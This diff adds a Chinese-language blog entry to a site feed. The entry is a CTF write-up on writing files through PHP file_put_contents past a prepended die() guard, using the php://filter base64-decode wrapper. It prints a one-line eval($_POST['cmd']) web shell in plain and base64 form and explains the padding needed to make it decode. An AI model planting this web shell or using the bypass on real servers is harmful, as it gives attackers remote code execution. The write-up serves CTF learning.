@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>file_puts_contents利用</title>
+    <link href="/2022/12/09/file-puts-contents%E5%88%A9%E7%94%A8/"/>
+    <url>/2022/12/09/file-puts-contents%E5%88%A9%E7%94%A8/</url>
+    
+    <content type="html"><![CDATA[<p>最近一次比赛，遇到了两个web题，都是关于<code>file_puts_content</code>利用的反序列化，挺有意思的，记录一下，核心代码如下。</p><figure><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">$d   = '<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"886"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>';$a= $d. $this->text;file_put_contents($this-> file,$a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>按照思路，利用写函数直接写一个shell就可以了，但是题目做了一点改变，把我们的数据添加在了<code>&lt;?php die(&quot;886&quot;);?&gt;</code>后面，所以在简单的写shell上面，需要做一点改变。</p><p>利用php的伪协议可以施展一点魔法做到这点。</p><h1>method base64</h1><p>使用<code>php://filter</code>的base64-decode方法，将输入的<code>text</code> base64加密传入，因为该伪协议接受一个base64字符串，然后将字符串解码后写入，所以明文的die等代码会被解密为乱码，而我们输入的base64-shell会被解码为正常的代码，从而绕过了题目的<code>&lt;?php die(&quot;886&quot;)?&gt;</code></p><figure><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>PD9waHAgZXZhbChAJF9QT1NUWydjbWQnXSk7Pz4=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>直接传参，发现生成的shell.php是一个空文件，也就意味着，写入失败了。<br><img src="https://fortypra.oss-cn-hangzhou.aliyuncs.com/img/20221209205217.png" alt=""></p><p>下面又引出了另外一个问题，base解码的时候，是8位一起解码的，所以说，输入的字符串需要能够被正常解码才可以，而看源代码:</p><figure><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"886"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>这里的<code>&lt; ? &gt; ()&quot; ;</code>都不在码表之内，所以不会翻译，去掉这些字符就只剩下<code>phpdie886</code>一共九个字符，是不会被正常解码的，所以我们还需要输入7个垃圾字符，填满16个字符，这样后面的shell才会被正确翻译。<br><img src="https://fortypra.oss-cn-hangzhou.aliyuncs.com/img/20221209205613.png" alt=""></p><p>这里我就只记录这一点了，其他的方式大同小异，各有各的绕过方法，具体链接如下： <a href="https://www.cnblogs.com/yokan/p/12650702.html">https://www.cnblogs.com/yokan/p/12650702.html</a><br>因为没注意base64的问题，所以打了很久都没通过，后来注意到了这个问题，也算是在web道路上越走越远了(smile)。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>反序列化</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>堆利用回顾</title>
     <link href="/2022/11/22/%E5%A0%86%E5%88%A9%E7%94%A8%E5%9B%9E%E9%A1%BE/"/>
     <url>/2022/11/22/%E5%A0%86%E5%88%A9%E7%94%A8%E5%9B%9E%E9%A1%BE/</url>
